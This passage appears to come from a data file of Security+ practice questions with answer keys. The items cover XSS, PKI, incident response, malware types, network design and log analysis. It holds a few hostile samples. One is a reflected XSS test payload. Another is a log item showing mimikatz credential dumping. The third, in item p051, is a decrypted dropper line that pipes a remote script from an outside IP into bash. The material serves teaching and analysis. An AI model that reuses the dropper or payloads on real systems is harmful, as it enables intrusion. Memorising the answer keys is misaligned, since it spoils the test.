Test 3: search?q=<script>alert('XSS')<\/script>
Output: <p>Results for: <script>alert('XSS')<\/script></p>
        [BROWSER ALERT FIRES — XSS CONFIRMED]

VULNERABILITY: Reflected XSS
Root cause: User input reflected in response without HTML encoding.
Fix: HTML-encode all output (e.g. < becomes &lt; > becomes &gt;)
    Implement Content-Security-Policy header.
    Set HttpOnly flag on session cookies.`,
    question:"The alert fires in Test 3. What does this confirm, and which fix addresses the ROOT CAUSE?",
    choices:[
      "SQL injection is confirmed — fix with parameterised queries",
      "Reflected XSS is confirmed — root cause fix is HTML-encoding all user input before outputting it in the page",
      "CSRF is confirmed — fix with anti-CSRF tokens",
      "Stored XSS is confirmed — fix by sanitising database inputs",
    ],
    correct:1,
    explanation:"The alert firing confirms Reflected XSS — the user's input (the script tag) is reflected back in the HTML response without encoding and the browser executes it. Root cause: missing output encoding. Fix: encode all user-supplied data before including it in HTML output (< → &lt;, > → &gt;, etc.). Secondary fixes: CSP headers restrict which scripts can execute; HttpOnly cookies prevent script access to session tokens even if XSS fires.",
    wrongFeedback:{0:"SQL injection attacks database queries — script tags in a URL parameter do not exploit databases.",2:"CSRF forges requests on behalf of an authenticated user — it does not involve script injection or alert boxes.",3:"Stored XSS would require the script to be saved to the database and served to all users — this fires immediately from the URL, confirming Reflected XSS."},
    objective:"2.3"},

  { id:"p033", type:"ORDERING", ch:"1", cat:"PKI & Certificates", difficulty:"hard",
    title:"Order the SSL/TLS certificate lifecycle",
    emoji:"📋",
    scenario:"A company needs to obtain and deploy an SSL/TLS certificate for their new web application. Place the certificate lifecycle steps in the correct order.",
    items:[
      {id:"a",label:"Install the certificate and private key on the web server"},
      {id:"b",label:"Generate a public/private key pair on the web server"},
      {id:"c",label:"Monitor certificate expiry and renew before it expires"},
      {id:"d",label:"Submit the Certificate Signing Request (CSR) to a trusted CA"},
      {id:"e",label:"Create a Certificate Signing Request (CSR) containing the public key and domain name"},
      {id:"f",label:"CA validates domain ownership/organisation identity and issues the signed certificate"},
    ],
    correctOrder:["b","e","d","f","a","c"],
    explanation:"TLS certificate lifecycle: 1-Generate key pair (private key stays on server — NEVER sent to CA). 2-Create CSR (contains public key + domain name + organisation info). 3-Submit CSR to CA (only the CSR is sent, not the private key). 4-CA validates identity and issues signed certificate. 5-Install certificate+private key on server. 6-Monitor and renew before expiry (typically 90 days to 1 year). The private key NEVER leaves the server — this is fundamental to PKI security.",
    objective:"1.4"},

  { id:"p034", type:"SCENARIO", ch:"4", cat:"Incident Response", difficulty:"medium",
    title:"Apply the correct incident response action",
    emoji:"📖",
    scenario:`An analyst receives an alert: a user account (jsmith) has just authenticated successfully from Singapore at 9:05 AM. The same account authenticated from the company's London office at 9:00 AM — five minutes earlier.

jsmith is a UK-based employee who has never been assigned to travel.

The analyst checks: jsmith's account has MFA enabled via an authenticator app.

No VPN or proxy usage detected for either session.`,
    question:"What should the analyst do FIRST, and why?",
    choices:[
      "Ignore the alert — the user probably shared their credentials with a colleague in Singapore",
      "Immediately disable jsmith's account and revoke all active sessions, then contact jsmith to verify if they initiated the Singapore login",
      "Wait 24 hours to see if more suspicious activity occurs before taking action",
      "Block Singapore's IP range permanently in the firewall",
    ],
    correct:1,
    explanation:"This is a classic 'impossible travel' indicator of compromise. London to Singapore in 5 minutes is physically impossible — one session is unauthorised. The fact that MFA was passed suggests either MFA bypass (real-time phishing/MFA fatigue attack) or the attacker has the MFA device. Immediate account suspension stops the attack while preserving investigation. Then verify with jsmith out-of-band (call their mobile, not email — email may be compromised). This follows the Containment phase of IR.",
    wrongFeedback:{0:"Sharing credentials violates security policy and does not explain MFA passing on both sessions — this is not a benign explanation.",2:"Waiting 24 hours during an active account compromise allows the attacker continued access — data exfiltration or lateral movement could occur.",3:"Blocking an entire country's IP range is a heavy-handed measure that affects all legitimate traffic from that region — disabling the specific compromised account is the targeted action."},
    objective:"4.8"},

  { id:"p035", type:"FILL BLANK", ch:"3", cat:"Network Infrastructure", difficulty:"medium",
    title:"Complete network security terminology",
    emoji:"✏️",
    scenario:"Fill in the correct network security term for each description.",
    blanks:[
      {id:"a",sentence:"A ___ is an intermediary server that sits between clients and the internet, forwarding requests on behalf of clients and optionally caching responses.",answer:"Proxy server",hint:"Forwards requests on behalf of clients"},
      {id:"b",sentence:"A ___ server or bastion host is used as the sole authorised access point to reach systems in a secure network zone, providing a single monitored path.",answer:"Jump server",hint:"Also called a bastion host"},
      {id:"c",sentence:"A ___ (DMZ) is a network segment between the internal network and the internet, hosting public-facing services like web servers.",answer:"Demilitarised Zone",hint:"Between internal and external networks"},
      {id:"d",sentence:"___ inspection tracks the state of active TCP connections and allows return traffic for established sessions while blocking unsolicited inbound packets.",answer:"Stateful",hint:"Tracks connection ___"},
      {id:"e",sentence:"An ___ detects suspicious traffic and alerts — it does NOT actively block. An IPS sits inline and DOES block suspicious traffic.",answer:"IDS",hint:"Intrusion Detection System"},
    ],
    explanation:"Key network device distinctions: Proxy=forwards client requests (can filter/cache). Jump server=single monitored access point to secure zones (critical for admin access control). DMZ=buffer zone hosting public services. Stateful firewall=tracks TCP state, allows legitimate return traffic. IDS=detect+alert only; IPS=detect+block inline. The IDS vs IPS distinction is a common exam trap.",
    objective:"3.2"},

  { id:"p036", type:"DRAG & DROP", ch:"2", cat:"Malware", difficulty:"easy",
    title:"Match malware types to their defining behaviour",
    emoji:"🔀",
    scenario:"Match each malware type to the behaviour that MOST uniquely defines it.",
    items:[
      {id:"a",label:"Ransomware"},
      {id:"b",label:"Worm"},
      {id:"c",label:"Trojan"},
      {id:"d",label:"Rootkit"},
      {id:"e",label:"Keylogger"},
      {id:"f",label:"Logic bomb"},
    ],
    targets:[
      {id:"1",label:"Encrypts victim's files and demands payment for the decryption key"},
      {id:"2",label:"Self-replicates across networks without user interaction by exploiting vulnerabilities"},
      {id:"3",label:"Disguises itself as legitimate software to trick users into installing it"},
      {id:"4",label:"Hides malicious processes at the OS/kernel level to evade detection"},
      {id:"5",label:"Silently records keystrokes to capture passwords and sensitive data"},
      {id:"6",label:"Remains dormant until a specific condition or date triggers execution"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5",f:"6"},
    explanation:"Malware behaviour signatures: Ransomware=encrypt+extort. Worm=autonomous network spread. Trojan=masquerading as legitimate software (named after the Trojan Horse). Rootkit=kernel-level concealment (requires specialised tools to detect). Keylogger=keystroke capture for credential theft. Logic bomb=triggered by condition (date, event, account deletion) — common insider threat tool.",
    objective:"2.4"},

  { id:"p037", type:"HOTSPOT", ch:"1", cat:"Cryptography", difficulty:"medium",
    title:"Identify the weakest element in a password storage implementation",
    emoji:"📍",
    scenario:"Review this password storage implementation and select the MOST critical security weakness.",
    diagram:`Password Storage System — Code Review

[A] Registration:
    password = user_input
    stored_password = base64_encode(password)
    db.save(username, stored_password)

[B] Login verification:
    stored = db.get(username)
    input_encoded = base64_encode(user_input)
    if input_encoded == stored: grant_access()

[C] Database entry example:
    username: alice
    password: cGFzc3dvcmQxMjM=   ← base64("password123")

[D] Administrator note:
    "Base64 is used to 'encrypt' passwords and prevent
     plaintext storage."`,
    hotspots:[
      {id:"a",label:"[A] Registration — base64 encoding instead of hashing",correct:true},
      {id:"b",label:"[B] Login — comparing encoded values",correct:false},
      {id:"c",label:"[C] Database entry format",correct:false},
      {id:"d",label:"[D] Administrator's misunderstanding of base64",correct:false},
    ],
    question:"Select the element that represents the MOST critical security weakness.",
    choices:[
      "The registration code — base64 is reversible encoding, not encryption or hashing; passwords are trivially recoverable",
      "The login code — comparing encoded values takes too long",
      "The database format — entries should use a different column name",
      "The admin note — the documentation is poorly written",
    ],
    correct:0,
    explanation:"The critical weakness is using base64 to 'protect' passwords. Base64 is a reversible encoding — anyone who reads 'cGFzc3dvcmQxMjM=' can instantly decode it to 'password123' with any base64 decoder. This provides ZERO security. Passwords must be hashed with a strong, slow hashing algorithm (bcrypt, Argon2, scrypt) with a unique salt per password. The admin's misunderstanding compounds the risk.",
    wrongFeedback:{1:"The login comparison logic is fine in concept — the problem is WHAT is being compared (easily reversed base64, not a real hash).",2:"Column naming is irrelevant to security — the algorithm used is what matters.",3:"Poor documentation is a concern, but the functional security flaw (reversible encoding) is the critical issue."},
    objective:"1.4"},

  { id:"p038", type:"ORDERING", ch:"4", cat:"Vulnerability Management", difficulty:"medium",
    title:"Order a penetration test methodology",
    emoji:"📋",
    scenario:"A company has hired a penetration testing firm. Place the penetration testing phases in the correct methodological order.",
    items:[
      {id:"a",label:"Exploitation — attempt to exploit discovered vulnerabilities"},
      {id:"b",label:"Planning and reconnaissance — agree scope, gather OSINT on the target"},
      {id:"c",label:"Reporting — document findings, evidence, and remediation recommendations"},
      {id:"d",label:"Scanning and enumeration — actively probe the target for open ports and services"},
      {id:"e",label:"Post-exploitation — assess what can be accessed from a compromised position"},
      {id:"f",label:"Clean-up — remove all tools, backdoors, and test accounts created during the test"},
    ],
    correctOrder:["b","d","a","e","f","c"],
    explanation:"Penetration testing methodology: 1-Planning/Recon (scoping rules of engagement + passive OSINT). 2-Scanning/Enumeration (active probing: port scans, service fingerprinting, vulnerability scanning). 3-Exploitation (attempt to compromise systems within scope). 4-Post-exploitation (privilege escalation, lateral movement, persistence assessment). 5-Clean-up (remove all test artefacts — CRITICAL to avoid leaving backdoors). 6-Reporting (written findings with evidence and prioritised recommendations). Clean-up before reporting is frequently tested.",
    objective:"4.3"},

  { id:"p039", type:"SCENARIO", ch:"5", cat:"Governance", difficulty:"easy",
    title:"Classify governance documents correctly",
    emoji:"📖",
    scenario:`A company's information security team has created the following four documents:

Document 1: "All employees must protect company confidential information and must not share it with unauthorised parties." — Signed by CEO, applies to all staff, mandatory.

Document 2: "Passwords for privileged accounts must be at least 16 characters and changed within 24 hours of a security incident." — Mandatory, measurable requirement.

Document 3: "Step 1: Open the ticketing system. Step 2: Create a new ticket with category 'Security Incident'. Step 3: Assign to the on-call analyst..." — Mandatory, sequential.

Document 4: "It is recommended that employees use a password manager to store their personal work passwords, though this is not required."`,
    question:"Which document is classified as a STANDARD?",
    choices:[
      "Document 1 — it is mandatory and signed by the CEO",
      "Document 2 — it contains specific, measurable requirements that are mandatory",
      "Document 3 — it contains step-by-step instructions",
      "Document 4 — it contains best practice recommendations",
    ],
    correct:1,
    explanation:"Document 2 is a Standard — it provides specific, measurable requirements (16-character minimum, 24-hour change requirement). Standards answer 'how much' and 'what type'. Document 1 is a Policy (high-level mandatory statement, signed by leadership). Document 3 is a Procedure (step-by-step instructions). Document 4 is a Guideline (recommended but not required). Policy → Standard → Procedure → Guideline is the hierarchy.",
    wrongFeedback:{0:"Document 1 is a Policy — high-level mandatory requirements without specific measurements. A policy says 'what must be done', a standard says 'how much'.",2:"Document 3 is a Procedure — step-by-step instructions for performing a task. Not a standard.",3:"Document 4 is a Guideline — recommended but not mandatory. Standards are mandatory."},
    objective:"5.1"},

  { id:"p040", type:"LOG ANALYSIS", ch:"4", cat:"Identity Management", difficulty:"hard",
    title:"Identify privilege escalation from Windows Event Logs",
    emoji:"📊",
    logData:`Windows Security Event Log

14:15:02  EventID 4624  Account: jsmith     Logon Type: 3 (Network)   Workstation: WS-042
14:15:10  EventID 4672  Account: jsmith     Special privileges assigned (SeDebugPrivilege, SeImpersonatePrivilege)
14:15:11  EventID 4688  Process: mimikatz.exe  PID:6601   Parent: powershell.exe   User: jsmith
14:15:12  EventID 4624  Account: Administrator Logon Type: 3  Source IP: 10.0.0.42 (= WS-042)
14:15:14  EventID 4648  Explicit credentials used: Administrator logged in WHILE jsmith was active session
14:15:20  EventID 4688  Process: PsExec.exe   User: Administrator   Target: \\\\DC-01
14:15:25  EventID 4624  Account: Administrator Logon Type: 3  Source: DC-01
          [Domain Controller access achieved]`,
    question:"What attack sequence do these events describe from start to finish?",
    choices:[
      "Normal administrator activity — administrators regularly use PsExec to manage domain controllers",
      "Credential dumping followed by Pass-the-Hash lateral movement: jsmith ran Mimikatz to dump credentials, then used Administrator's NTLM hash to authenticate without the plaintext password",
      "Brute force attack on the Administrator account — EventID 4624 shows repeated login attempts",
      "A phishing attack delivered via email that installed mimikatz.exe",
    ],
    correct:1,
    explanation:"Event chain: jsmith logs in (4624) → granted dangerous privileges (4672: SeDebugPrivilege allows reading LSASS memory) → mimikatz.exe launched via PowerShell (4688: credential dump tool) → Administrator logs in from the SAME machine (4648: explicit credentials/PtH) → PsExec used for lateral movement to DC. This is Pass-the-Hash: Mimikatz extracts NTLM hashes from LSASS memory; PtH uses the hash directly for authentication without knowing the plaintext password.",
    wrongFeedback:{0:"PsExec to a DC is legitimate in some contexts, but the Mimikatz execution and privilege escalation sequence clearly indicate malicious activity.",2:"EventID 4624 shows successful logons, not attempts. Brute force would show multiple EventID 4625 (failed logons) preceding a success.",3:"Phishing delivers the initial access — the events shown describe post-compromise credential dumping and lateral movement, not initial delivery."},
    objective:"4.8"},

  { id:"p041", type:"DRAG & DROP", ch:"3", cat:"Data Protection", difficulty:"medium",
    title:"Match data states to their protection method",
    emoji:"🔀",
    scenario:"Match each data state to its appropriate primary protection method.",
    items:[
      {id:"a",label:"Data at rest (stored on disk)"},
      {id:"b",label:"Data in transit (moving across a network)"},
      {id:"c",label:"Data in use (being processed in RAM/CPU)"},
      {id:"d",label:"Backup data on tape"},
      {id:"e",label:"Data shared via email"},
    ],
    targets:[
      {id:"1",label:"Full-disk encryption or file-level encryption"},
      {id:"2",label:"TLS/SSL transport encryption"},
      {id:"3",label:"Trusted Execution Environment (TEE) or memory encryption"},
      {id:"4",label:"AES encryption of the backup media before transport"},
      {id:"5",label:"S/MIME or PGP end-to-end email encryption"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"Data state protection: At rest → FDE/AES encryption (BitLocker, LUKS, VeraCrypt). In transit → TLS 1.2+ for most protocols (HTTPS, SFTP, SMTPS). In use → TEEs (Intel SGX, AMD SEV) or Confidential Computing — the hardest state to protect since data must be decrypted for processing. Backup tapes → encrypt before leaving the building (AES-256). Email → S/MIME (certificate-based) or PGP (web of trust) for end-to-end encryption.",
    objective:"3.3"},

  { id:"p042", type:"SCENARIO", ch:"2", cat:"Threat Intelligence", difficulty:"medium",
    title:"Apply the Cyber Kill Chain to an incident",
    emoji:"📖",
    scenario:`Security analysts are investigating a breach. Evidence collected:

Stage evidence found:
→ A phishing email with a PDF attachment was sent to finance@company.com
→ The PDF exploited CVE-2023-XXXX to drop a DLL loader onto the victim's workstation
→ The loader connected to 198.51.100.45 and downloaded additional tooling
→ The attacker escalated privileges using a local admin account found in a script
→ Lateral movement occurred to the payroll server using RDP
→ 45,000 employee payroll records were exfiltrated via HTTPS to 198.51.100.45
→ Ransomware was deployed across 12 servers`,
    question:"At which Cyber Kill Chain phase did the attacker FIRST establish a foothold inside the network?",
    choices:[
      "Reconnaissance — the phishing email was sent",
      "Delivery — the PDF attachment was sent to the victim",
      "Exploitation — the PDF vulnerability was triggered and code executed on the victim's system",
      "Installation — the DLL loader was installed and called home"],
    correct:2,
    explanation:"Cyber Kill Chain phases: Reconnaissance→Weaponisation→Delivery→Exploitation→Installation→Command & Control→Actions on Objectives. The FOOTHOLD is established at Exploitation — when the vulnerability is triggered and the attacker first executes code on the victim's machine. Before exploitation, the attacker has no presence inside the network. Delivery (the email arriving) has not yet given them access. The DLL installation and C2 communication are subsequent phases.",
    wrongFeedback:{0:"Reconnaissance happens before the attack begins — the attacker researching the target. No network access yet.",1:"Delivery is the phase where the attack vehicle (the phishing email+PDF) is sent — the attacker still has no foothold, the email is just an attempt.",3:"Installation comes AFTER exploitation — the DLL loader is installed after the CVE exploit fires. The foothold was established at exploitation."},
    objective:"2.1"},

  { id:"p043", type:"FILL BLANK", ch:"4", cat:"Incident Response", difficulty:"easy",
    title:"Complete the incident response terminology",
    emoji:"✏️",
    scenario:"Fill in the correct incident response term for each description.",
    blanks:[
      {id:"a",sentence:"The ___ is the documented record of who collected, handled, and transferred digital evidence — maintaining it is critical for legal admissibility.",answer:"Chain of Custody",hint:"Evidence handling documentation"},
      {id:"b",sentence:"___ is a legal order requiring an organisation to preserve all potentially relevant data when litigation is anticipated.",answer:"Legal Hold",hint:"Preservation order before lawsuit"},
      {id:"c",sentence:"___ involves proactively searching for threats that have evaded automated detection tools.",answer:"Threat Hunting",hint:"Active searching for hidden attackers"},
      {id:"d",sentence:"A ___ exercise is discussion-based — participants talk through a simulated incident without affecting any live systems.",answer:"Tabletop",hint:"Around a table, no systems touched"},
      {id:"e",sentence:"___ refers to attacker techniques designed to obstruct or destroy forensic evidence, such as deleting logs or wiping drives.",answer:"Anti-forensics",hint:"Counter-investigation techniques"},
    ],
    explanation:"IR terminology on CompTIA Security+: Chain of custody documents every evidence transfer — breaks make evidence inadmissible. Legal hold must be applied BEFORE routine deletion occurs (deletion after anticipated litigation = spoliation). Threat hunting assumes breach and looks for stealthy activity. Tabletop exercises test plans without system impact. Anti-forensics (log deletion, timestamp manipulation, file wiping) indicate deliberate concealment — elevates suspicion of insider threat or sophisticated actor.",
    objective:"4.8"},

  { id:"p044", type:"CONFIG/ACL", ch:"3", cat:"Network Security", difficulty:"hard",
    title:"Design network segmentation for a DMZ",
    emoji:"⚙️",
    scenario:"A company needs to segment their network to host a public web server securely. Review the four proposed network designs and select the one that CORRECTLY implements a DMZ.",
    currentConfig:`Current flat network (no segmentation):
Internet → Firewall → [All servers on same LAN: Web, DB, Internal apps]
Problem: Web server breach = full internal access`,
    options:[
      `Option A — Single firewall DMZ:
Internet → [Firewall] → DMZ (Web Server) → [Same Firewall] → Internal LAN (DB + Apps)
Web server in DMZ. Internal LAN protected by separate firewall zone.`,
      `Option B — No DMZ:
Internet → [Firewall] → Web Server + DB + Internal Apps (all on same LAN)
Web server directly on internal LAN.`,
      `Option C — Reversed DMZ:
Internet → DMZ (DB + Internal Apps) → [Firewall] → Web Server facing internet
Database in DMZ, web server protected.`,
      `Option D — Double firewall DMZ:
Internet → [Outer Firewall] → DMZ (Web Server) → [Inner Firewall] → Internal LAN (DB + Apps)
Highest security — two separate firewall devices.`],
    correct:3,
    explanation:"Option D (double firewall DMZ) is the most secure: the outer firewall only allows internet traffic to the web server in the DMZ. The inner firewall only allows the web server to connect to specific DB ports on the internal LAN. A breach of the web server does not give the attacker direct access to the internal LAN — they must also breach the inner firewall. Option A uses a single firewall with zones — acceptable but less secure than D. Option B has no segmentation. Option C wrongly places the database in the externally accessible DMZ.",
    wrongFeedback:{0:"Option A provides adequate segmentation with a single firewall using DMZ zones — it is correct but less robust than a double firewall design.",1:"Option B replicates the flat network problem — all servers on the same segment means a web server breach grants full LAN access.",2:"Option C is dangerously wrong — the database should NEVER be in the DMZ (internet-facing zone). It should be on the most protected internal segment."},
    objective:"3.2"},

  { id:"p045", type:"TERMINAL SIM", ch:"1", cat:"Authentication", difficulty:"medium",
    title:"Diagnose a Kerberos authentication failure",
    emoji:"💻",
    scenario:"A user reports they cannot access a network share despite having the correct credentials. You need to diagnose the Kerberos authentication issue.",
    hint:"Use: check-kerberos-ticket or check-time",
    answer:`Kerberos Ticket Check:
No valid TGT found for user jsmith

System Time Check:
Local time:  10:30:00 UTC
KDC time:    10:36:45 UTC
Time skew:   6 minutes 45 seconds

ERROR: Kerberos maximum clock skew exceeded (default: 5 minutes)
The time difference between the client and the KDC is too large.
Kerberos requires clocks to be synchronised within 5 minutes to prevent replay attacks.

FIX: Synchronise the client's clock with the NTP server.
     Command: w32tm /resync  (Windows)
     Command: ntpdate ntp.server.com  (Linux)`,
    question:"Why does Kerberos enforce a maximum clock skew of 5 minutes?",
    choices:[
      "To reduce network bandwidth by limiting ticket size",
      "To prevent replay attacks — Kerberos tickets include timestamps, and a large clock skew could allow old tickets to be replayed successfully",
      "To ensure users log in during business hours only",
      "To comply with GDPR time-stamping requirements for authentication logs",
    ],
    correct:1,
    explanation:"Kerberos tickets contain timestamps and have a short lifetime (typically 8-10 hours). The 5-minute clock skew limit prevents replay attacks: if a ticket is captured, the attacker only has a 5-minute window within which it could be replayed before the timestamp mismatch triggers rejection. A larger clock skew would extend this replay window. NTP (Network Time Protocol) synchronisation is therefore a security requirement in Kerberos environments.",
    wrongFeedback:{0:"Clock skew has nothing to do with network bandwidth or ticket size — it is a pure security control.",2:"Kerberos authentication is time-sensitive for technical security reasons, not to enforce business hours.",3:"GDPR concerns privacy and data protection — it has no specific requirements for Kerberos clock skew."},
    objective:"1.2"},

  { id:"p046", type:"DRAG & DROP", ch:"5", cat:"Risk Management", difficulty:"medium",
    title:"Match risk response strategies to scenarios",
    emoji:"🔀",
    scenario:"Match each risk response strategy to the scenario that BEST represents it.",
    items:[
      {id:"a",label:"Purchase cyber insurance to cover potential ransomware losses"},
      {id:"b",label:"Shut down the e-commerce platform entirely due to unacceptable payment fraud risk"},
      {id:"c",label:"Document the known risk of running an unsupported OS and obtain management sign-off"},
      {id:"d",label:"Deploy MFA to reduce the risk of account compromise"},
      {id:"e",label:"Outsource payment processing to a PCI DSS-certified third party"},
    ],
    targets:[
      {id:"1",label:"Risk Transfer (financial instrument)"},
      {id:"2",label:"Risk Avoidance"},
      {id:"3",label:"Risk Acceptance"},
      {id:"4",label:"Risk Mitigation"},
      {id:"5",label:"Risk Transfer (contractual)"},
    ],
    correctMapping:{a:"1",b:"2",c:"3",d:"4",e:"5"},
    explanation:"Risk responses: Transfer via insurance = financial instrument shifting loss to insurer. Avoidance = stop the activity creating the risk (no platform = no fraud). Acceptance = acknowledge risk formally and continue (must have management sign-off and documentation). Mitigation = implement controls to reduce likelihood/impact. Transfer via outsourcing = contractual transfer of operational risk to a third party (the payment processor assumes PCI DSS compliance risk). Note: outsourcing transfers risk but not all accountability — you're still accountable to regulators.",
    objective:"5.2"},

  { id:"p047", type:"LOG ANALYSIS", ch:"3", cat:"Cloud Security", difficulty:"hard",
    title:"Identify cloud misconfiguration from access logs",
    emoji:"📊",
    logData:`AWS CloudTrail Log — S3 Bucket: company-hr-data

2024-01-15 09:00:01  PutBucketACL  User: admin@company.com  
                     ACL: public-read  ← bucket made PUBLIC

2024-01-15 09:00:15  GetObject  IP: 203.0.113.45  
                     User: ANONYMOUS  File: employee_salaries_2024.csv  ← External download

2024-01-15 09:00:17  GetObject  IP: 185.220.101.10  
                     User: ANONYMOUS  File: hr_database_full_export.sql

2024-01-15 09:01:44  GetObject  IP: 198.51.100.23  
                     User: ANONYMOUS  File: employee_ssn_list.xlsx

2024-01-15 09:15:00  PutBucketACL  User: admin@company.com  
                     ACL: private  ← bucket made private again (too late)

Total anonymous downloads: 147 files in 15 minutes`,
    question:"What occurred, what type of breach is this, and what preventive control would have MOST directly prevented it?",
    choices:[
      "A brute-force attack on the AWS account — prevention: stronger AWS root account password",
      "A misconfiguration data breach — an admin briefly made an S3 bucket public, allowing anonymous download of sensitive HR data. Prevention: S3 Block Public Access setting at the account level",
      "A supply chain attack — the AWS management console was compromised by a vendor",
      "An insider threat — the admin intentionally shared the data and then covered their tracks",
    ],
    correct:1,
    explanation:"This is a misconfiguration breach — the admin accidentally (or intentionally) set the bucket to public-read, and automated scanners or attackers (who constantly probe for public S3 buckets) downloaded 147 files containing salary data, full HR database, and SSN lists in 15 minutes. Prevention: Enable 'S3 Block Public Access' at the AWS account or organisation level — this overrides any bucket-level ACL changes and prevents any bucket from being made public. This is the single most impactful S3 security control.",
    wrongFeedback:{0:"No failed login attempts appear in the logs. The admin's own credentials were used — the vulnerability was misconfiguration, not authentication.",2:"Supply chain attacks compromise vendor software/access. This log shows a direct AWS API call from the admin's own account.",3:"Intent is unclear — the bucket was made private again after 15 minutes. Whether accidental or intentional, the technical control needed is S3 Block Public Access."},
    objective:"3.1"},

  { id:"p048", type:"ORDERING", ch:"5", cat:"Business Continuity", difficulty:"hard",
    title:"Order BCP recovery objectives by priority",
    emoji:"📋",
    scenario:"A hospital's primary data centre has failed. Order the recovery actions from the most to least urgent based on business continuity principles and healthcare criticality.",
    items:[
      {id:"a",label:"Restore patient electronic health records (EHR) — patient care depends on medication and allergy data"},
      {id:"b",label:"Restore HR and payroll systems — staff must be paid by end of month"},
      {id:"c",label:"Restore life-critical monitoring systems in ICU — equipment communicates patient vitals"},
      {id:"d",label:"Restore the hospital's public website — patients use it to book appointments"},
      {id:"e",label:"Restore email system — doctors need to communicate securely"},
      {id:"f",label:"Restore financial reporting systems — quarterly audit is in 2 weeks"},
    ],
    correctOrder:["c","a","e","b","f","d"],
    explanation:"Recovery priority in healthcare: 1-Life-critical ICU systems (immediate patient safety risk). 2-EHR system (medication errors, allergy alerts — patient safety). 3-Secure email (care coordination between clinicians). 4-HR/payroll (staff continuity — people stop coming to work without pay). 5-Financial reporting (important but 2-week window). 6-Public website (lowest criticality — patients can call). This order reflects the BIA (Business Impact Analysis) principle: highest impact to patient safety = highest priority.",
    objective:"5.2"},

  { id:"p049", type:"SCENARIO", ch:"1", cat:"Cryptography", difficulty:"hard",
    title:"Evaluate a TLS configuration for weaknesses",
    emoji:"📖",
    scenario:`A security assessment of a web server reveals the following TLS configuration:

Supported TLS versions: TLS 1.0, TLS 1.1, TLS 1.2, TLS 1.3
Supported cipher suites (TLS 1.2):
  - TLS_RSA_WITH_AES_128_CBC_SHA (RSA key exchange)
  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (RSA key exchange)
  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ECDHE key exchange)
  - TLS_DHE_RSA_WITH_AES_128_CBC_SHA (DHE key exchange)

HSTS header: not present
Certificate: RSA 2048-bit, SHA-256, expires in 90 days`,
    question:"Which TWO findings represent the MOST critical security weaknesses in this configuration?",
    choices:[
      "TLS 1.0 and 1.1 are enabled (deprecated, known vulnerabilities like POODLE and BEAST) AND RSA key exchange ciphers lack forward secrecy",
      "The certificate uses RSA 2048-bit which is too weak AND expires in 90 days",
      "TLS 1.3 is enabled (too new) AND ECDHE ciphers are computationally expensive",
      "SHA-256 is outdated AND HSTS is not configured",
    ],
    correct:0,
    explanation:"Critical findings: (1) TLS 1.0 and 1.1 are deprecated — TLS 1.0 is vulnerable to POODLE and BEAST attacks. Disable both, support only TLS 1.2 and 1.3. (2) RSA key exchange cipher suites (TLS_RSA_WITH_*) lack forward secrecy — if the server's private key is later compromised, ALL past encrypted sessions can be decrypted. Remove RSA key exchange ciphers; keep only ECDHE and DHE suites which provide Perfect Forward Secrecy (PFS). The missing HSTS is also worth fixing but less critical than these two.",
    wrongFeedback:{1:"RSA 2048-bit is currently acceptable (NIST recommends 2048+ until 2030). 90-day expiry is normal for Let's Encrypt certificates — it's not a weakness.",2:"TLS 1.3 is the most secure version — it should be enabled, not disabled. ECDHE ciphers are preferred precisely because they provide forward secrecy.",3:"SHA-256 is the recommended hash algorithm for certificates. HSTS is important but not the most critical finding compared to deprecated TLS versions."},
    objective:"1.4"},

  { id:"p050", type:"FILL BLANK", ch:"4", cat:"Monitoring & SIEM", difficulty:"medium",
    title:"Complete security monitoring and SIEM terminology",
    emoji:"✏️",
    scenario:"Fill in the correct security monitoring term for each description.",
    blanks:[
      {id:"a",sentence:"A ___ is a honeypot or decoy system intentionally placed on a network to attract and monitor attacker activity.",answer:"Honeynet",hint:"A network of decoy systems"},
      {id:"b",sentence:"___ provides network flow metadata (source/destination IPs, ports, bytes transferred) without capturing full packet contents.",answer:"NetFlow",hint:"Cisco's flow data protocol"},
      {id:"c",sentence:"A ___ alert occurs when a security tool identifies a genuine attack or malicious activity correctly.",answer:"True Positive",hint:"Correct detection of real attack"},
      {id:"d",sentence:"A ___ alert occurs when a security tool fires on benign activity that is not actually malicious.",answer:"False Positive",hint:"Incorrect alert on innocent activity"},
      {id:"e",sentence:"___ (UEBA) uses behavioural analytics and machine learning to detect anomalies that deviate from a user's or entity's normal baseline behaviour.",answer:"User and Entity Behaviour Analytics",hint:"UEBA — detects behavioural anomalies"},
    ],
    explanation:"SIEM/monitoring terminology: Honeynet = network of honeypots designed to study attacker behaviour after initial compromise. NetFlow = flow data without payload (lower storage, broad visibility). True Positive = real threat correctly detected. False Positive = benign activity incorrectly flagged (causes alert fatigue). UEBA = ML-based behavioural baseline modelling (detects impossible travel, unusual access hours, data staging) — goes beyond signature-based detection.",
    objective:"4.4"},
  // ── Imported PBQs p051-p100 from secplus-pbq-50-new.html ──
  {
      "id": "p051",
      "ch": "1",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "medium",
      "cat": "Cryptography",
      "title": "Decode a Base64-encoded OpenSSL payload",
      "scenario": "During a malware investigation, an analyst finds an encoded payload string embedded in a PowerShell script on a compromised host.",
      "question": "Select the correct command to decode and decrypt the Base64-encoded AES-256-CBC encrypted file \"payload.enc\" using password \"S3cur3P@ss\".",
      "explanation": "openssl enc -d = decrypt. -aes-256-cbc = cipher. -base64 = decode Base64 before decryption. -pass pass: = password. The decoded content is a classic dropper — piping a remote shell script to bash executes malware directly in memory without writing to disk (fileless execution). This is a core incident response skill for analysing suspicious encoded content.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "analyst@ubuntu:~$ file payload.enc\npayload.enc: ASCII text\nanalyst@ubuntu:~$ head -3 payload.enc\nU2FsdGVkX1+ABcd1234...\n\nDECRYPTED CONTENT:\n#!/bin/bash\ncurl -s http://185.220.101.45/stage2.sh | bash\n# Fileless dropper — pipes remote script to bash\n[ALERT] C2 server identified: 185.220.101.45\n[MITRE] T1059.004 Unix Shell + T1105 Ingress Tool Transfer",
      "choices": [
        "openssl enc -d -aes-256-cbc -base64 -in payload.enc -pass pass:S3cur3P@ss",
        "openssl genrsa -aes256 -out payload.key 2048",
        "openssl dgst -sha256 payload.enc",
        "openssl enc -e -aes-256-cbc -base64 -in payload.enc -out out.txt"
      ],
      "correct": 0
    },
    {
      "id": "p052",
